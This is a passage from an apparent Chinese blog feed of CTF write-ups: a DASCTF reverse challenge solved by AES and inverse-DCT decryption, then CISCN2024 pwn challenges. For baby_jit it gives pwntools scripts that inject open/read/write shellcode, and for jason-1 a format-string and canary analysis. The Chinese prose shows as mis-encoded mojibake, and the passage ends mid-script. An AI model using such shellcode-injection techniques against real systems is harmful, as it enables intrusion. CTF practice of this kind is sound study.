class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_hash</span>(<span class="hljs-params">input_str</span>):<br>    key_bytes = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">16</span>)<br>    temp = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:<br>        char_val = <span class="hljs-built_in">ord</span>(char)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            temp[j] = ((temp[j] * <span class="hljs-number">31</span>) + char_val) % <span class="hljs-number">251</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        key_bytes[i] = temp[i] % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(key_bytes)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data))<br>    <span class="hljs-keyword">return</span> decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;\x08\x07\x06\x05\x04\x03\x02\x01&#x27;</span>)  <span class="hljs-comment"># å»æ‰å¡«å……å­—ç¬¦</span><br><br><span class="hljs-comment"># å·²çŸ¥çš„å¯†é’¥å­—ç¬¦ä¸²</span><br>KEY = <span class="hljs-string">&quot;DSACTF&quot;</span><br><br><span class="hljs-comment"># å·²çŸ¥çš„å¯†æ–‡</span><br>encrypted_data = <span class="hljs-string">&quot;TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==&quot;</span><br><br><span class="hljs-comment"># ç”Ÿæˆè§£å¯†å¯†é’¥</span><br>key = custom_hash(KEY)<br><br><span class="hljs-comment"># è§£å¯†æ•°æ®</span><br>decrypted_data = decrypt(encrypted_data, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†åçš„æ•°æ®:&quot;</span>, decrypted_data)<br></code></pre></td></tr></table></figure><p>MainActivityçœ‹ä¸å‡ºå•¥</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479890172-7372c393-88cc-460e-86f0-40452d8429cd.png" class="" title="img"><p>æœ‰ä¸ªsoå±‚åŠ è½½çš„ï¼Œå½“æ—¶8.3åç¼–è¯‘ä¸äº†ï¼Œåé¢å‘ç°7.7å¯ä»¥ï¼Œæœç„¶ä¸åŒç‰ˆæœ¬çš„è¿˜æ˜¯å¾—è¯•è¯•</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721533710176-d3441e0b-e3f8-4bbe-b645-9788768f16af.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527213369-cecdd1f1-e538-48b4-82e6-27270d11d286.png" class="" title="img"><p>è¿›åˆ°encrypté‡Œé¢ï¼Œé—®gptå‘ç°æ˜¯DCT</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527194587-753d377e-5fe4-45e2-ab69-f8146928e8ef.png" class="" title="img"><p>è§£å¯†ï¼Œå‘ç°æœ€åä¸€ä½æ˜¯125ï¼Œåº”è¯¥æ˜¯å¯¹çš„</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721527289813-cacad651-ad53-4064-bd67-00fe19461c1a.png" class="" title="img"><p>ç›´æ¥æ‰‹åŠ¨å››èˆäº”å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> idct<br><br><span class="hljs-comment"># æä¾›çš„åŠ å¯†æ•°æ®</span><br>encrypted_data = [<span class="hljs-number">458.853181</span>, -<span class="hljs-number">18.325492</span>, -<span class="hljs-number">18.251911</span>, -<span class="hljs-number">2.097520</span>, -<span class="hljs-number">21.198660</span>, -<span class="hljs-number">22.304648</span>, <span class="hljs-number">21.103162</span>, -<span class="hljs-number">5.786284</span>,<br>                  -<span class="hljs-number">15.248906</span>, <span class="hljs-number">15.329286</span>, <span class="hljs-number">16.919499</span>, -<span class="hljs-number">19.669045</span>, <span class="hljs-number">30.928253</span>, -<span class="hljs-number">37.588034</span>, -<span class="hljs-number">16.593954</span>, -<span class="hljs-number">5.505211</span>,<br>                  <span class="hljs-number">3.014744</span>, <span class="hljs-number">6.553616</span>, <span class="hljs-number">31.131491</span>, <span class="hljs-number">16.472500</span>, <span class="hljs-number">6.802400</span>, -<span class="hljs-number">78.278577</span>, <span class="hljs-number">15.280099</span>, <span class="hljs-number">3.893073</span>, <span class="hljs-number">56.493581</span>,<br>                  -<span class="hljs-number">34.576344</span>, <span class="hljs-number">30.146729</span>, <span class="hljs-number">4.445671</span>, <span class="hljs-number">6.732204</span>]<br><br><span class="hljs-comment"># æ‰§è¡Œç¦»æ•£ä½™å¼¦åå˜æ¢</span><br>decrypted_data = idct(encrypted_data, norm=<span class="hljs-string">&#x27;ortho&#x27;</span>)<br><br><span class="hljs-comment"># æ‰“å°è§£å¯†åçš„æ•°æ®</span><br><span class="hljs-built_in">print</span>(decrypted_data)<br><br><br>a=[<span class="hljs-number">68</span>,<span class="hljs-number">65</span>,<span class="hljs-number">83</span>,<span class="hljs-number">67</span>,<span class="hljs-number">84</span>,<span class="hljs-number">70</span>,<span class="hljs-number">123</span>,<span class="hljs-number">89</span>,<span class="hljs-number">48</span>,<span class="hljs-number">117</span>,<span class="hljs-number">95</span>,<span class="hljs-number">65</span>,<span class="hljs-number">114</span>,<span class="hljs-number">51</span>,<span class="hljs-number">82</span>,<span class="hljs-number">101</span>,<span class="hljs-number">52</span>,<span class="hljs-number">108</span>,<span class="hljs-number">108</span>,<span class="hljs-number">121</span>,<span class="hljs-number">95</span>,<span class="hljs-number">72</span>,<span class="hljs-number">64</span>,<span class="hljs-number">99</span>,<span class="hljs-number">107</span>,<span class="hljs-number">51</span>,<span class="hljs-number">114</span>,<span class="hljs-number">33</span>,<span class="hljs-number">125</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;Y0u_Ar3Re4lly_H@ck3r!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>SMC</tag>
      
      <tag>Android</tag>
      
      <tag>DCT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024åä¸œå—åˆ†åŒºèµ›pwnå¤ç°</title>
    <link href="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="baby-jit-1"><a href="#baby-jit-1" class="headerlink" title="baby_jit-1"></a>baby_jit-1</h1><p>ç¦ç”¨execveé‚£å°±ç”¨orw</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1719301407336-69b1dfb3-9991-4ae3-a791-a006f1e4a411.png" class="" title="img"><p>è¿™é‡Œè«åä¼šåˆ†é…ç©ºé—´ï¼Œå°è¯•æ”¹æˆ*4</p><p>å®é™…ä¸Šå¤šåˆ†é…çš„8ä¸ªå­—èŠ‚ç”¨æ¥å†™æ•°å­—</p><p><img src="/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741402451304-feac0fd2-5647-4985-a7d1-97d4b79cc164.png" alt="img"><img src="/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741417320412-6297dc58-9ee5-43e9-a266-d67e7852bc85.png" alt="img"></p><p>åé¢åç§»è‡ªå·±è§„å®š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1389</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-44h]</span><br>    <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-40h]</span><br>    <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-3Ch]</span><br>    <span class="hljs-type">char</span> *endptr; <span class="hljs-comment">// [rsp+18h] [rbp-38h] BYREF</span><br>    <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+20h] [rbp-30h]</span><br>    <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// [rsp+28h] [rbp-28h]</span><br>    __int64 v7; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>    <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>    <span class="hljs-type">char</span> s[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h] BYREF</span><br>    <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>    v10 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;offset?&quot;</span>);<br>    fgets(s, <span class="hljs-number">8</span>, <span class="hljs-built_in">stdin</span>);<br>    v2 = (<span class="hljs-type">int</span>)(atof(s) * <span class="hljs-number">12.0</span>);<br>    v3 = <span class="hljs-number">12</span> * dword_402C + <span class="hljs-number">4</span>;<br>    v6 = (<span class="hljs-type">char</span> *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x100000</span>, <span class="hljs-number">12</span> * dword_402C + <span class="hljs-number">20</span>, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>    v6[v3 - <span class="hljs-number">4</span>] = <span class="hljs-number">72</span>;<br>    v6[v3 - <span class="hljs-number">3</span>] = <span class="hljs-number">-119</span>;<br>    v6[v3 - <span class="hljs-number">2</span>] = <span class="hljs-number">-40</span>;<br>    v6[v3 - <span class="hljs-number">1</span>] = <span class="hljs-number">-61</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; dword_402C; ++i )<br>    &#123;<br>        s1 = (<span class="hljs-type">char</span> *)*((_QWORD *)ptr + i);<br>        *v6 = <span class="hljs-number">72</span>;<br>        v6[<span class="hljs-number">1</span>] = <span class="hljs-number">-72</span>;<br>        v5 = strtoull(s1 + <span class="hljs-number">4</span>, &amp;endptr, <span class="hljs-number">10</span>);<br>        *(_QWORD *)(v6 + <span class="hljs-number">2</span>) = v5;<br>        v6 += <span class="hljs-number">10</span>;<br>        *v6 = <span class="hljs-number">72</span>;<br>        v6[<span class="hljs-number">2</span>] = <span class="hljs-number">-61</span>;<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;add&quot;</span>, <span class="hljs-number">3uLL</span>) )<br>        &#123;<br>            v6[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;sub&quot;</span>, <span class="hljs-number">3uLL</span>) )<br>        &#123;<br>            v6[<span class="hljs-number">1</span>] = <span class="hljs-number">41</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;xor&quot;</span>, <span class="hljs-number">3uLL</span>) )<br>        &#123;<br>            v6[<span class="hljs-number">1</span>] = <span class="hljs-number">49</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;and&quot;</span>, <span class="hljs-number">3uLL</span>) )<br>        &#123;<br>            v6[<span class="hljs-number">1</span>] = <span class="hljs-number">33</span>;<br>        &#125;<br>        v6 += <span class="hljs-number">3</span>;<br>    &#125;<br>    v7 = ((__int64 (*)(<span class="hljs-type">void</span>))(v2 + <span class="hljs-number">0x100000</span>))();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result = %llu\n&quot;</span>, v7);<br>    munmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x100000</span>, v3);<br>    <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v10;<br>&#125;<br></code></pre></td></tr></table></figure><p>addçš„æ•°å­—ä¼šè¢«å†™åˆ°0x100002</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741419621080-71fa4d32-cf26-4600-b492-3adfd99e4bf8.png" class="" title="img"><p>æœ€åçš„shellcodeéœ€è¦å…ˆè¦†ç›–åŸæ¥çš„8ä¸ªå­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>() : <span class="hljs-keyword">return</span> base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">g</span>():<br>    gdb.attach(p)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">d</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">red</span>(<span class="hljs-params">sd</span>):<br>    d(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&quot;name:&quot;</span>,<span class="hljs-built_in">str</span>(sd))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>(<span class="hljs-params">index</span>):<br>    d(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&quot;et?&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index</span>):<br>    d(<span class="hljs-number">1</span>)<br>    sl((index))<br><br>p = process(<span class="hljs-string">&#x27;./baby_jit&#x27;</span>)<br><br>pp = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">xchg rdx,rsi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>calc= <span class="hljs-built_in">str</span>(u64(pp.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)))<br><span class="hljs-comment">#print(calc)</span><br>add(<span class="hljs-string">b&#x27;add 364776757688991850&#x27;</span>)<br><br><span class="hljs-built_in">exec</span>(<span class="hljs-number">0.2</span>)<br><span class="hljs-comment">#g()</span><br>sl(<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">8</span>+asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>å¦‚æœorwéƒ½ç¦æ­¢äº†çš„è¯ä¹Ÿå¯ä»¥ç”¨cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>FILENAME=<span class="hljs-string">&#x27;./baby_jit&#x27;</span><br>p= process(FILENAME)<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">context</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendline(context)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">context</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;offset&#x27;</span>)<br>    p.sendline(context)<br>sh=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push   rax</span><br><span class="hljs-string">pop    rdi</span><br><span class="hljs-string">push   rdx</span><br><span class="hljs-string">pop    rsi</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>calc_sh= <span class="hljs-built_in">str</span>(u64(asm(sh).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)))<br><br>Add(<span class="hljs-string">f&#x27;add <span class="hljs-subst">&#123;calc_sh&#125;</span>&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>Exec(<span class="hljs-string">b&#x27;0.2&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;\x90&#x27;</span>*(<span class="hljs-number">0x20</span>)+asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>)))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jason-1"><a href="#jason-1" class="headerlink" title="jason-1"></a>jason-1</h1><p>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741488852671-f32552f1-11ae-42f6-83a6-08f12858524c.png" class="" title="img"><p>ç¬¬ä¸€ååº”å°±æ˜¯æŠŠprtinfæ”¹æˆputs</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741851029777-2baab6d9-3a92-47aa-bb65-e28d4d05eb5e.png" class="" title="img"><p>ç”±äºç»™çš„æ˜¯ç›¸å¯¹åç§»ï¼Œæ ¹æ®ä¸Šè¿°æŒ‡ä»¤çš„è§„å¾‹å’Œç›´è§‰æ€§ï¼Œç›¸å¯¹åç§»åº”è¯¥æ˜¯0xffffc1xxï¼Œ0x4ff7-0x4feb&#x3D;0xcï¼Œå°è¯•åœ¨c4çš„åŸºç¡€ä¸Š+cæˆ–è€…-cï¼Œå¯ä»¥ç›´æ¥å®Œæˆfix</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741489225016-d4f9af0f-91d9-4fab-94a7-17e921af60a5.png" class="" title="img"><p>0xFFFFC1C4 æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯ -0x3E3C</p><p>ç›®æ ‡åœ°å€ &#x3D; call æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ + åç§»é‡</p><p>ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä¸º0000000000004FFC</p><p>ç›®æ ‡åœ°å€ &#x3D; 0x4FFC - 0x3E3C &#x3D; 0x11C0</p><p>ä¿æŠ¤å…¨å¼€</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741489623511-c53afcee-88c0-4a1a-b71d-b3a64f683a22.png" class="" title="img"><p>ç»æµ‹è¯•canaryåç§»ä¸º25ï¼Œlibcåç§»ä¸º27</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741703288176-0a4ca688-08ed-49b6-a522-d7a68518124c.png" class="" title="img"><p>å­˜åœ¨æ ˆæº¢å‡ºçš„å‡½æ•°åœ¨ä¸€ä¸ªæœªå‘½åçš„å‡½æ•°ä¸‹é¢æ¯”è¾ƒéš¾æ‰¾</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741703458047-3b09e815-1c17-44db-be43-c4b47f794810.png" class="" title="img"><p>å¦å¤–ï¼Œå‰é¢å‡½æ•°å¯ä»¥æ§åˆ¶readé•¿åº¦å®¹æ˜“å­˜åœ¨æº¢å‡ºï¼Œè¾“å…¥å¤§é‡å­—ç¬¦ä¹Ÿèƒ½å‘ç°æ¼æ´</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741703581935-39b30db1-d0dc-41d4-adce-90cb9a9d74d7.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 